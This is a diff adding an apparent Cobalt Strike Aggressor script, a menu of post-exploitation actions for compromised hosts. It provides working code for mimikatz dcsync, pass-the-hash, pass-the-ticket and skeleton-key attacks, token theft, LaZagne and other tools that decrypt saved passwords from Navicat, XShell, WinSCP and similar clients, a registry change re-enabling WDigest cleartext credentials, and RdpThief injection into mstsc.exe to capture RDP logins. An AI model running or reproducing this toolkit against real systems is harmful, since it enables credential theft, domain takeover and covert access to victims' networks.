@@ -1,0 +1,291 @@
+popup beacon_bottom {
+    menu "mimikatz" {
+    	item "Mimikatz-bdcsync"{
+    		local('$bid');
+               foreach $bid ($1){
+                   mimikatz_bdcsync($bid);
+            }
+    	}
+    	item "Mimikatz-ptt"{
+    		local('$bid');
+               foreach $bid ($1){
+                   mimikatz_ptt($bid);
+            }
+    	}
+    	item "Mimikatz-logonpasswords"{
+    		local('$bid');
+               foreach $bid ($1){
+                   mimikatz_logonpasswords($bid);
+            }
+    	}
+    	item "Mimikatz-command"{
+    		local('$bid');
+               foreach $bid ($1){
+                   mimikatz_command($bid);
+            }
+    	}
+    	item "Mimikatz-pth"{
+    		local('$bid');
+               foreach $bid ($1){
+                   mimikatz_passthehash($bid);
+            }
+    	}
+    	item "Mimikatz-Skeleton"{
+    		local('$bid');
+               foreach $bid ($1){
+                   mimikatz_skeleton($bid);
+            }
+    	}
+    	menu "Mimikatz-ticket"{
+    		item "purge-tickets"{
+    			local('$bid');
+               		foreach $bid ($1){
+                   		 purge_tickets($bid);
+            	}
+    		}
+    	}
+    	menu "Mimikatz-token"{
+    		item "getuid"{
+    			local('$bid');
+    			foreach $bid ($1){
+    				get_uid($bid);
+    			}
+    		}
+    		item "steal-token"{
+    			local('$bid');
+    			foreach $bid ($1){
+    				steal_token($bid);
+    			}
+    		}
+    	}
+    	item "Navicat-Password"{
+    		local('$bid');
+               foreach $bid ($1){
+                   navicat_password($bid);
+            }
+    	}
+    	menu "LaZagne"{
+    		item "upload lazagne"{
+        	local('$bid');
+        	foreach $bid ($1){
+            bupload($1, "script/lazagne.exe");
+        		}
+        	}
+        	item "LaZagne" {
+			$bid = $1['@'];
+			$dialog = dialog("LaZagne", %(args => "",bid => $bid), &lazagne_password);
+			drow_text($dialog, "args", "args:  ");
+            dbutton_action($dialog, "RUN");
+			dialog_show($dialog);
+        	}
+        	item "del lazagne"{
+        	local('$bid');
+        	foreach $bid ($1){
+            	bshell($1, "del /f /s /q lazagne.exe");
+        	}
+		}
+
+    	}
+    	item "Internal-Monologue"{
+    		local('$bid');
+               foreach $bid ($1){
+                   internal_monologue($bid);
+            }
+    	}
+    	menu "DecryptPwd" {
+        
+		item "DecryptPwd" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpDecryptPwd", %(type => "-NavicatCrypto",bid => $bid), &Sharp_DecryptPwd);
+			drow_combobox($dialog, "type", "Type:", @("-NavicatCrypto", "-TeamViewer", "-FileZilla", "-WinSCP"));
+            dbutton_action($dialog, "Chong!!!");
+			dialog_show($dialog);
+        }
+		item "DecryptXShell" {
+			$bid = $1['@'];
+			$dialog = dialog("DecryptXShell", %(type => "-Xmangager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &Decrypt_XShell);
+			dialog_description($dialog, "DecryptXShell");
+			drow_combobox($dialog, "type", "Type:", @("-Xmangager"));
+			drow_text($dialog, "path", "Sessions Path:  ");
+            dbutton_action($dialog, "Chong!!!");
+			dialog_show($dialog);
+        }
+		
+    	}
+    	menu "win 2012_mimikatz" {
+		item "edit_reg" {
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
+        }
+		}
+        }
+        menu "RdpThief"{
+        item "Rdpthief_Enable"{
+            blog($1, "RdpThief enabled \n");
+            add(@beacons,$1,0);
+        }
+
+        item "Rdpthief_Disable"{
+            blog($1, "Disabling RdpThief");
+            remove(@beacons,$1);
+        }
+
+        item "Rdpthief_Dump"{
+            bshell($1,"type %temp%\\data.bin");
+        }
+    }
+    }
+}
+sub mimikatz_bdcsync{
+	$bid = $1;	
+	$dialog = dialog("DomainInfo" , %(beacon => $1 , domain => "PLAYLAND.testlab" , user => "PLAYLAND\\Administrator") , lambda({
+		bdcsync($3["beacon"] , $3["domain"] , $3["user"])
+	}));
+	dialog_description($dialog, "Use mimikatz's dcsync command to pull a user's password hash from a domain controller.");
+	drow_text($dialog, "beacon",  "Beacon:");
+	drow_text($dialog, "domain", "Domain:");
+	drow_text($dialog, "user", "User:");
+	dbutton_action($dialog, "Launch");
+	dialog_show($dialog);
+}
+sub mimikatz_ptt{
+	$bid = $1;
+	$dialog = dialog("Kirbi File:" , %(beacon => $1 , file => "/download/file.ext") , 
+	lambda({
+		bkerberos_ticket_use($3["beacon"] , $3["file"])
+	}
+	)
+	);
+	dialog_description($dialog, "Ask beacon to inject a mimikatz kirbi file into the user's kerberos tray.");
+	drow_text($dialog, "beacon",  "Beacon:");
+	drow_file($dialog, "file", "Kirbi File:");
+	dbutton_action($dialog, "Launch");
+	dialog_show($dialog);
+}
+sub mimikatz_logonpasswords{
+	$bid = $1;
+	blogonpasswords($bid);
+}
+sub mimikatz_command{
+	$bid = $1;
+	$dialog = dialog("Command" , %(beacon => $1 , command => "standard::coffee") , 
+	lambda({
+		bmimikatz($3["beacon"] , $3["command"]);
+	}
+	)
+	);
+	dialog_description($dialog, "Ask Beacon to run a mimikatz command.");
+	drow_text($dialog, "beacon",  "Beacon:");
+	drow_text($dialog, "command",  "Command:");
+	dbutton_action($dialog, "Launch");
+	dialog_show($dialog);
+}
+sub mimikatz_passthehash{
+	$bid = $1;
+	$dialog = dialog("Pass-The-Hash" , %(beacon => $1 , domain => "GLITTER" , user => "administrator" , hash => "hash") , 
+	lambda({
+		bpassthehash($3["beacon"] , $3["domain"] , $3["user"] , $3["hash"]);
+	}
+	)
+	);
+	dialog_description($dialog, "Ask Beacon to create a token that passes the specified hash. This is the pth command in Beacon. It uses mimikatz.");
+	drow_text($dialog, "beacon",  "Beacon:");
+	drow_text($dialog, "domain",  "Domain:");
+	drow_text($dialog, "user",  "User:");
+	drow_text($dialog, "hash",  "Hash:");
+	dbutton_action($dialog, "Launch");
+	dialog_show($dialog);
+}
+sub mimikatz_skeleton{
+	$bid = $1;
+	bmimikatz($bid , "misc::skeleton");
+}
+sub purge_tickets{
+	$bid = $1;
+	bkerberos_ticket_purge($bid);
+}
+sub get_uid{
+	$bid = $1;
+	bgetuid($bid);
+}
+sub steal_token{
+	$bid = $1;
+	$dialog = dialog("steal-token" , %(beacon => $1 , processid => "2") , 
+	lambda({
+		bsteal_token($3["beacon"] , int($3["processid"]));
+	}
+	)
+	);
+	dialog_description($dialog, "Ask Beacon to steal a token from a process.");
+	drow_text($dialog, "beacon",  "Beacon:");
+	drow_text($dialog, "processid",  "ProcessID:");
+	dbutton_action($dialog, "Launch");
+	dialog_show($dialog);
+}
+sub navicat_password{
+	$binary = "script/navicatpwd.exe";
+	$help = "Automatic access to Navicat connection information and password";
+	beacon_command_register("navicat", $help, "Use: navicat <Automatically export all and decrypt>\nnavicat 12 <Decrypt with 12 algorithms> OR navicat 15057D7BA390\nnavicat 15057D7BA390 12<Decrypt the password of parameter one with 12 algorithm>\n\n$help");
+	if(!-exists $binary)
+	{
+		berror($1, "Navicat binary cannot be found at $binary");
+		return;
+	}
+	bexecute_assembly($1, $binary);
+}
+sub lazagne_password{
+	$arg = join(' ', @($3['args']));
+	bshell($bid, "lazagne.exe $arg");
+}
+sub internal_monologue{
+	$binary = "script/InternalMonologue.exe";
+	$help = "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS";
+	beacon_command_register("lazagne", $help, "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS.\n\n$help");
+	if(!-exists $binary)
+	{
+		berror($1, "InternalMonologue binary cannot be found at $binary");
+		return;
+	}
+	$args = "-Downgrade True -Verbose True";
+	bexecute_assembly($1, $binary, $args);
+}
+sub Sharp_DecryptPwd {
+	
+		bexecute_assembly($bid, script_resource("script/SharpDecryptPwd.exe"), $3['type']);
+	
+}
+sub Decrypt_XShell {
+		$arg = join(' ', @($3['type'],"-p",$3['path']));
+		bexecute_assembly($bid, script_resource("script/SharpDecryptPwd.exe"), $arg);
+}
+@beacons = @();
+@pids = @();
+
+on heartbeat_5s{
+
+		foreach $index => $beaconid (@beacons)
+		{
+		   
+		    bps($beaconid,&handleProcess);
+		}	
+
+}
+sub handleProcess{
+	
+	$processList = $2;
+	$index = indexOf($processList, "mstsc.exe", 0) + 9;
+
+	if($index > 9){
+
+		$temp = substr($processList,$index,-1);
+		$pid = split("\t",$temp)[2];
+
+		if ($pid !in @pids){
+			add(@pids,$pid,0);
+			blog($1,"Injecting into mstsc.exe with PID: $pid");
+			bshinject($1, $pid , "x64" ,script_resource("script/RdpThief_x64.tmp"));
+		}
+		
+	}
+}
